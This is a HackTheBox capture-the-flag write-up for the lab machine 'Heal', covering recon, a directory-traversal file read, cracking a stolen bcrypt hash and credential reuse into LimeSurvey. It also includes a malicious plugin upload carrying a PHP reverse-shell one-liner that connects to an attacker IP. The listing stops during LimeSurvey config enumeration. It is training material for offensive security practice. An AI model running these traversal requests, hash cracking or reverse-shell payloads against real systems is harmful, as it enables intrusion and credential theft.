---
render_with_liquid: false
title: HackTheBox Writeup - Heal
date: 2024-12-19 18:53:34 +1400
tags: [hackthebox, nmap, linux, cariddi, gobuster, vhost, nodejs, api, broken-access-control, directory-traversal, ruby-on-rails, discover-secrets, sqlite, hashcat, credentials-stuffing, limesurvey, limesurvey2rce, password-spraying, consul]
image:
    path: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90cc-4ba1-4555-bdca-529a1e6b7a7e.png
    width: 640
    height: 480
---



Heal is a medium-difficult Linux machine that features a website vulnerable to arbitrary file read, allowing us to extract sensitive credentials. The server also hosts a LimeSurvey instance, where the leaked credentials can be used to log in as an administrator. Since administrators can upload plugins, we can exploit this to upload a malicious plugin and gain a reverse shell as the `www-data` user. Further enumeration reveals the database password for LimeSurvey, which is reused by the system user `ron`, allowing us to escalate access. The server also runs a local instance of the Consul Agent as `root`. By registering a malicious service via the Consul API, we can escalate privileges and gain root access.

# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ pt init '10.10.11.46 heal.htb api.heal.htb take-survey.heal.htb'
+---------+--------+-------------+----------------------+
| PROFILE | STATUS |     IP      |        DOMAIN        |
+---------+--------+-------------+----------------------+
| heal    | on     | 10.10.11.46 | heal.htb             |
| heal    | on     | 10.10.11.46 | api.heal.htb         |
| heal    | on     | 10.10.11.46 | take-survey.heal.htb |
+---------+--------+-------------+----------------------+
```

## Nmap

```bash
# Nmap 7.94SVN scan initiated Thu Dec 19 18:53:34 2024 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.10.11.46
Nmap scan report for 10.10.11.46
Host is up, received user-set (0.20s latency).
Scanned at 2024-12-19 18:53:34 CST for 15s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWKy4neTpMZp5wFROezpCVZeStDXH5gI5zP4XB9UarPr/qBNNViyJsTTIzQkCwYb2GwaKqDZ3s60sEZw362L0o=
|   256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMCYbmj9e7GtvnDNH/PoXrtZbCxr49qUY8gUwHmvDKU
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 19 18:53:49 2024 -- 1 IP address (1 host up) scanned in 15.11 seconds
```


## 80 - HTTP : Fast Resume Builder


### Info

```ruby
http://heal.htb [200] [Heal] [nginx/1.18.0 (Ubuntu)] [b57be17f9d1837ae4261edd88a0f41cf1c2006c8] [Express,Nginx:1.18.0,Node.js,React,Ubuntu]
```

![](/assets/obsidian/e275d89334a2c8a3e792816b417c900c.png)

### Directory

- The web server returns `503` error code when large amount of web requests are sent 

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ cat httpx/urls.txt | cariddi -rua -info -s -e -ext 4 -sr -intensive
                 _     _     _ _
                (_)   | |   | (_)
   ___ __ _ _ __ _  __| | __| |_
  / __/ _` | '__| |/ _` |/ _` | |
 | (_| (_| | |  | | (_| | (_| | |
  \___\__,_|_|  |_|\__,_|\__,_|_| v1.3.2

 > github.com/edoardottt/cariddi
 > edoardoottavianelli.it
========================================
http://heal.htb:80
http://heal.htb:80/robots.txt
http://heal.htb:80/sitemap.xml
http://heal.htb:80/static/js/bundle.js
http://heal.htb:80/static/js/main.chunk.js
http://heal.htb:80/manifest.json
http://heal.htb:80/static/js/0.chunk.js
```

### Subdomains

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -k -t 100 -u http://$(pt get rhost)
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://heal.htb
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: api.heal.htb Status: 200 [Size: 12515]
Progress: 59449 / 100001
```

# User Flag
---

## Shell as www-data


### 80 - heal.htb : Enumeration

> http://heal.htb/

Sign up a new account

![](/assets/obsidian/bb6f3e104bfd30a1a7dfdb77fb710099.png)

![](/assets/obsidian/837536ecaa0a613dbdd812c080eb02fb.png)

![](/assets/obsidian/a90b08cf7120df6c42d6ac91df3c4f29.png)

> http://heal.htb/survey

- The survey function reveals another virtual host : `take-survey.heal.htb`

![](/assets/obsidian/66bc0f89f5825576dde8c8c982c0f69d.png)

> http://take-survey.heal.htb/index.php/552933?lang=en

![](/assets/obsidian/4b26b140b4eae2a73fd3bb83c14ef9b8.png)

> http://take-survey.heal.htb/index.php

- The home page shows that it's powered by **LimeSurvey**, and the administrator's username is `ralph`
- **LimeSurvey** have a potential RCE exploit

![](/assets/obsidian/6d1107a07dbc93cc5f4b7e598a08a4f4.png)

### 80 - api.heal.htb : Broken access control & Directory traversal

After crawling and saving the node js web files with **cariddi**, got all the endpoints the web app at `heal.htb` was using

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal/output-cariddi]
└─$ grep -rin api.heal.htb
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:476:      const url = isSignUp ? "http://api.heal.htb/signup" : "http://api.heal.htb/signin";
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:827:        const response = await axios__WEBPACK_IMPORTED_MODULE_2__["default"].get("http://api.heal.htb/profile", {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:848:      await axios__WEBPACK_IMPORTED_MODULE_2__["default"].delete("http://api.heal.htb/logout", {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:1158:        const response = await axios__WEBPACK_IMPORTED_MODULE_2__["default"].get("http://api.heal.htb/resume", {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:1178:      await axios__WEBPACK_IMPORTED_MODULE_2__["default"].delete("http://api.heal.htb/logout", {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:1330:      const response = await axios__WEBPACK_IMPORTED_MODULE_2__["default"].post("http://api.heal.htb/exports", {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:1341:      const downloadResponse = await axios__WEBPACK_IMPORTED_MODULE_2__["default"].get(`http://api.heal.htb/download?filename=${filename}`, {
```

`http://api.heal.htb/download?filename=${filename}` endpoint is interesting, and it needs a valid token

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal/output-cariddi]
└─$ curl 'http://api.heal.htb/download?filename=/etc/passwd'
{"errors":"Invalid token"} 
```

The authorization's header format is `Authorization: Bearer ${localStorage.getItem("token")}`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal/output-cariddi]
└─$ grep -rin api.heal.htb -E5
[...]
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1325-    `;
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1326-  };
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1327-  const handleExport = async format => {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1328-    const htmlContent = generateHtmlContent();
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1329-    try {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:1330:      const response = await axios__WEBPACK_IMPORTED_MODULE_2__["default"].post("http://api.heal.htb/exports", {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1331-        content: htmlContent,
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1332-        format: format
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1333-      }, {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1334-        headers: {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1335-          Authorization: `Bearer ${localStorage.getItem("token")}`
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1336-        }
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1337-      });
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1338-      const {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1339-        filename
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1340-      } = response.data;
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:1341:      const downloadResponse = await axios__WEBPACK_IMPORTED_MODULE_2__["default"].get(`http://api.heal.htb/download?filename=${filename}`, {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1342-        responseType: "blob",
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1343-        headers: {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1344-          Authorization: `Bearer ${localStorage.getItem("token")}`
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1345-        }
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1346-      });
[...]
```

Get token from `localstorage`

- `CTRL + SHIFT + I` to open developer tools -> Local Storage

![](/assets/obsidian/01a000ad07ae559c00b7f50c02af905c.png)

Now the function works. `ralph` and `ron` are the normal users on the machine, tried to get `id_rsa` key from their home folders but failed

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' 'http://api.heal.htb/download?filename=/etc/passwd' -s | grep sh$
root:x:0:0:root:/root:/bin/bash
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

Since `download` function didn't appear in my menu at `heal.htb`, assume that the function was designed to be accessible for `Administrators` only, but the access control failed

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal/output-cariddi]
└─$ grep -rin admin -E5
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1039-    __source: {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1040-      fileName: _jsxFileName,
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1041-      lineNumber: 75,
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1042-      columnNumber: 13
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1043-    }
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:1044:  }, "Admin:"), /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement("span", {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1045-    className: "profile-value",
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1046-    __self: undefined,
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1047-    __source: {
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1048-      fileName: _jsxFileName,
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1049-      lineNumber: 76,
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1050-      columnNumber: 13
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1051-    }
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:1052:  }, profile.is_admin ? "Yes" : "No")))));
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1053-};
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1054-/* harmony default export */ __webpack_exports__["default"] = (Profile);
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1055-
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1056-/***/ }),
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt-1057-
```

Got some full paths starting with `/home/ralph/` from the `js` files, confirmed that `api.heal.htb` web app could be running as `ralph`, but they don't contain interesting secrets

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal/output-cariddi]
└─$ grep -rin ralph
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:200:var _jsxFileName = "/home/ralph/resume-builder/src/App.js";
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:361:var _jsxFileName = "/home/ralph/resume-builder/src/components/Error.js";
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:459:var _jsxFileName = "/home/ralph/resume-builder/src/components/Home.js";
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:813:var _jsxFileName = "/home/ralph/resume-builder/src/components/Profile.js";
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:1128:var _jsxFileName = "/home/ralph/resume-builder/src/components/ResumeForm.js";
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:1804:var _jsxFileName = "/home/ralph/resume-builder/src/components/TakeSurvey.js";
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:1942:var _jsxFileName = "/home/ralph/resume-builder/src/index.js";
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:2009:__webpack_require__(/*! /home/ralph/resume-builder/node_modules/react-dev-utils/webpackHotDevClient.js */"./node_modules/react-dev-utils/webpackHotDevClient.js");
heal.htb:80/01f31a0684dc8ea37c0bb7a7385177034556298b.txt:2010:module.exports = __webpack_require__(/*! /home/ralph/resume-builder/src/index.js */"./src/index.js");
```

We successfully read `/home/ralph/resume-builder/package.json`, no dependencies seems to be highly vulnerable

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' 'http://api.heal.htb/download?filename=/home/ralph/resume-builder/package.json'
{
  "name": "resume-builder",
  "version": "0.1.0",
  "private": true,
  "dependencies": {
    "@testing-library/jest-dom": "^5.17.0",
    "@testing-library/react": "^13.4.0",
    "@testing-library/user-event": "^13.5.0",
    "axios": "^1.7.2",
    "react": "^18.3.1",
    "react-dom": "^18.3.1",
    "react-router-dom": "^6.24.1",
    "react-scripts": "^3.0.1",
    "web-vitals": "^2.1.4"
  },
  "scripts": {
    "start": "react-scripts start",
    "build": "react-scripts build",
    "test": "react-scripts test",
    "eject": "react-scripts eject"
  },
  "eslintConfig": {
    "extends": [
      "react-app",
      "react-app/jest"
    ]
  },
  "browserslist": {
    "production": [
      ">0.2%",
      "not dead",
      "not op_mini all"
    ],
    "development": [
      "last 1 chrome version",
      "last 1 firefox version",
      "last 1 safari version"
    ]
  }
}
```

The source codes have nothing interesting to note

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' 'http://api.heal.htb/download?filename=/home/ralph/resume-builder/src/index.js'
import React from 'react';
import ReactDOM from 'react-dom/client';
import './index.css';
import App from './App';
import reportWebVitals from './reportWebVitals';

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);

// If you want to start measuring performance in your app, pass a function
// to log results (for example: reportWebVitals(console.log))
// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals
reportWebVitals();
```

### 80 - api.heal.htb : Loot sqlite database

`api.heal.htb` uses **Ruby on Rails**, try to get its default config files

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ echo api.heal.htb | httpx -random-agent -td -server -title -fr -sc -hash sha1 -silent -ss -timeout 20 -srd httpx_api.heal.htb
http://api.heal.htb [200] [Ruby on Rails 7.1.4] [nginx/1.18.0 (Ubuntu)] [b4f574251e15e023660d57d6c8ef0459a854c9ef] [Nginx:1.18.0,Ubuntu]
```

- Google : `ruby on rails config file location`

> https://reinteractive.com/articles/rails-config-files-guide

![](/assets/obsidian/0df69f7114047cd5a897df74c757ca83.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' 'http://api.heal.htb/download?filename=config/database.yml'
{"errors":"File not found"}                                                                                                                                                                                      
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' 'http://api.heal.htb/download?filename=../config/database.yml'
{"errors":"File not found"}                                                                                                                                                                                      
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' 'http://api.heal.htb/download?filename=../../config/database.yml'
# SQLite. Versions 3.8.0 and up are supported.
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem "sqlite3"
#
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3
```

Get `production` database

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' 'http://api.heal.htb/download?filename=../../storage/development.sqlite3' > loot/development.sqlite3
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 32768  100 32768    0     0  54713      0 --:--:-- --:--:-- --:--:-- 54704
```

Dump the whole database

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ sqlite3 loot/development.sqlite3 .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "token_blacklists" ("id" integer PRIMARY KEY AUTOINCREMENT NOT NULL, "token" varchar, "created_at" datetime(6) NOT NULL, "updated_at" datetime(6) NOT NULL);
CREATE TABLE IF NOT EXISTS "users" ("id" integer PRIMARY KEY AUTOINCREMENT NOT NULL, "email" varchar, "password_digest" varchar, "created_at" datetime(6) NOT NULL, "updated_at" datetime(6) NOT NULL, "fullname" varchar, "username" varchar, "is_admin" boolean);
INSERT INTO users VALUES(1,'ralph@heal.htb','$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG','2024-09-27 07:49:31.614858','2024-09-27 07:49:31.614858','Administrator','ralph',1);
INSERT INTO users VALUES(2,'a@a.com','$2a$12$YRbRGBSb526kx7ImTNTpgOA0S.vi/GjH4KzBdPKFkYMGxaHawDyP.','2024-12-19 17:38:30.398831','2024-12-19 17:38:30.398831','a','a',0);
INSERT INTO users VALUES(3,'sam@root.com','$2a$12$O5tv/fF2h2LkmQX60BR.Te/t9FA7byfR/Xj/PvHdAnRwzpXdQ4wQS','2024-12-19 17:56:37.496887','2024-12-19 17:56:37.496887','sam','sam',0);
CREATE TABLE IF NOT EXISTS "schema_migrations" ("version" varchar NOT NULL PRIMARY KEY);
INSERT INTO schema_migrations VALUES('20240702133115');
INSERT INTO schema_migrations VALUES('20240702131229');
INSERT INTO schema_migrations VALUES('20240702053125');
INSERT INTO schema_migrations VALUES('20240702032524');
INSERT INTO schema_migrations VALUES('20240701161836');
CREATE TABLE IF NOT EXISTS "ar_internal_metadata" ("key" varchar NOT NULL PRIMARY KEY, "value" varchar, "created_at" datetime(6) NOT NULL, "updated_at" datetime(6) NOT NULL);
INSERT INTO ar_internal_metadata VALUES('environment','development','2024-09-27 07:49:07.266676','2024-09-27 07:49:07.266679');
INSERT INTO ar_internal_metadata VALUES('schema_sha1','86dacdae5e53daf6a99cc195f85ec397dbaa71b5','2024-09-27 07:49:07.269048','2024-09-27 07:49:07.269049');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',3);
COMMIT;
```

Extract and crack hashes

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ sqlite3 loot/development.sqlite3 .dump | grep 'INSERT INTO users' | awk -F, '{print $2":"$3}' | tr -d "'" | tee loot/development.sqlite3.hash
ralph@heal.htb:$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
a@a.com:$2a$12$YRbRGBSb526kx7ImTNTpgOA0S.vi/GjH4KzBdPKFkYMGxaHawDyP.
sam@root.com:$2a$12$O5tv/fF2h2LkmQX60BR.Te/t9FA7byfR/Xj/PvHdAnRwzpXdQ4wQS
```

```bash
hashcat loot/development.sqlite3.hash /opt/wordlists/rockyou.txt --user -m 3200
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ hashcat loot/development.sqlite3.hash /opt/wordlists/rockyou.txt --user -m 3200 --show
ralph@heal.htb:$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
```

### 80 - take-survey.heal.htb : Credential stuffing

> http://take-survey.heal.htb/index.php/admin/authentication/sa/login

- Login : `ralph:147258369`

![](/assets/obsidian/e901e0cf3c135c5263dd752a20e18476.png)

The credential worked

![](/assets/obsidian/1ed3f352a08b16bd549d2754fc60da20.png)

- **LimeSurvey**'s version is `6.6.4`

![](/assets/obsidian/e3e1d4a9db06731b636ab3f4ca7086da.png)

### 80 - LimeSurvey 6.6.4 : Authenticated RCE

- Google : `LimeSurvey exploit`

> POC - https://github.com/Y1LD1R1M-1337/Limesurvey-RCE

> Authenticated users can upload plugins to gain code execution
{: .prompt-info }

```bash
cd exploit
git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE
cd Limesurvey-RCE
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal/exploit/Limesurvey-RCE]
└─$ vi exploit.py
```

There's are 3 lines that needs to be changed

![](/assets/obsidian/6942abb784ac775ddb5fc07142be785e.png)

![](/assets/obsidian/9a62b77317720e81b9e14cf5e62b9988.png)

![](/assets/obsidian/a3351594ce423049b0bcc5d6ee2d5f75.png)

Exploit manually to simplify the steps 

- The plugin structure requires `config.xml` and a php file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal/exploit/Limesurvey-RCE]
└─$ 7z l Y1LD1R1M.zip
[...]
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-12-05 23:39:43 .....          756          330  config.xml
2021-12-02 20:47:14 .....         2430          940  php-rev.php
------------------- ----- ------------ ------------  ------------------------
2021-12-05 23:39:43               3186         1270  2 files
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal]
└─$ cat config.xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>Y1LD1R1M</name>
        <type>plugin</type>
        <creationDate>2020-03-20</creationDate>
        <lastUpdate>2020-03-31</lastUpdate>
        <author>Y1LD1R1M</author>
        <authorUrl>https://github.com/Y1LD1R1M-1337</authorUrl>
        <supportUrl>https://github.com/Y1LD1R1M-1337</supportUrl>
        <version>5.0</version>
        <license>GNU General Public License version 2 or later</license>
        <description>
                <![CDATA[Author : Y1LD1R1M]]></description>
    </metadata>

    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```

Write a php reverse shell then pack it into a plugin zip file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal/exploit/Limesurvey-RCE]
└─$ vi rev.php
<?php system("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.87/1111 0>&1'"); ?>

┌──(bravosec㉿fsociety)-[~/htb/Heal/exploit/Limesurvey-RCE]
└─$ zip rev.zip rev.php config.xml
  adding: rev.php (deflated 9%)
  adding: config.xml (deflated 56%)
```

> http://take-survey.heal.htb/index.php/admin/pluginmanager?sa=index

Upload plugin zip file

![](/assets/obsidian/38353f80eafe8de87c64c91800dd1343.png)

While uploading the plugin file, it shows : `The plugin is not compatible with your version of LimeSurvey.`

![](/assets/obsidian/c2979170a10697e9c1faa3f134de54ef.png)

- Google : `The plugin is not compatible with your version of LimeSurvey.`

> REF - https://www.limesurvey.org/manual/Extension_compatibility

There's a section in `config.xml` to control the compatible versions of **LimeSurvey**

![](/assets/obsidian/db0cd50474651ab27734e4179e9bfdb8.png)

![](/assets/obsidian/46cf00aeb0c84d22f28b8346b0eaf782.png)

Just add `<version>6.0</version>` in the `compatibility` section of `config.xml` to make it compatible for version `6.6.4`

![](/assets/obsidian/c26d0ce02bb10ff16df5e747a9870000.png)

Upload the plugin again

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal/exploit/Limesurvey-RCE]
└─$ zip rev.zip rev.php config.xml
updating: rev.php (deflated 9%)
updating: config.xml (deflated 57%)
```

![](/assets/obsidian/6d38fdd93c56a715bb2f39f42790c3dd.png)

![](/assets/obsidian/9aaefee0dd2cd4943df270640f0c0319.png)

Active the plugin

![](/assets/obsidian/d58bb955eb43433bc48c1812c325bf63.png)

Start reverse shell listener

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal/exploit/Limesurvey-RCE]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
```

Visit `rev.php`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal/exploit/Limesurvey-RCE]
└─$ curl take-survey.heal.htb/upload/plugins/Y1LD1R1M/rev.php
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Heal/exploit/Limesurvey-RCE]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.87] from (UNKNOWN) [10.10.11.46] 54610
/usr/bin/script -qc /bin/bash /dev/null
www-data@heal:~/limesurvey/upload/plugins/Y1LD1R1M$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Heal/exploit/Limesurvey-RCE]
└─$ stty raw -echo;fg
export TERM=xterm
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
www-data@heal:~/limesurvey/upload/plugins/Y1LD1R1M$ stty rows 50 columns 209
www-data@heal:~/limesurvey/upload/plugins/Y1LD1R1M$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## From www-data to ron


### Harvesting - Limesurvey config

- Google : `LimeSurvey config file location`

![](/assets/obsidian/bbfeeb0333a98e53b95cd5e43fd92acf.png)

```bash
www-data@heal:~$ cd /var/www/limesurvey/application/config/
www-data@heal:~/limesurvey/application/config$ ls -latr
total 192
-rwxr-x---  1 www-data www-data   732 Sep 27 10:27 version.php
-rwxr-x---  1 www-data www-data 11917 Sep 27 10:27 vendor.php
-rwxr-x---  1 www-data www-data   801 Sep 27 10:27 updater_version.php
-rwxr-x---  1 www-data www-data  9525 Sep 27 10:27 tcpdf.php
-rwxr-x---  1 www-data www-data  2553 Sep 27 10:27 routes.php
-rwxr-x---  1 www-data www-data   611 Sep 27 10:27 rest.php
-rwxr-x---  1 www-data www-data  3713 Sep 27 10:27 questiontypes.php
-rwxr-x---  1 www-data www-data 12450 Sep 27 10:27 packages.php
-rwxr-x---  1 www-data www-data  9638 Sep 27 10:27 ldap.php
-rwxr-x---  1 www-data www-data 21697 Sep 27 10:27 internal.php
-rwxr-x---  1 www-data www-data   114 Sep 27 10:27 index.html
-rwxr-x---  1 www-data www-data  6153 Sep 27 10:27 fonts.php
-rwxr-x---  1 www-data www-data  2695 Sep 27 10:27 email.php
-rwxr-x---  1 www-data www-data  2551 Sep 27 10:27 console.php
-rwxr-x---  1 www-data www-data  2975 Sep 27 10:27 config-sample-sqlsrv.php
-rwxr-x---  1 www-data www-data  3025 Sep 27 10:27 config-sample-pgsql.php
-rwxr-x---  1 www-data www-data  3041 Sep 27 10:27 config-sample-mysql.php
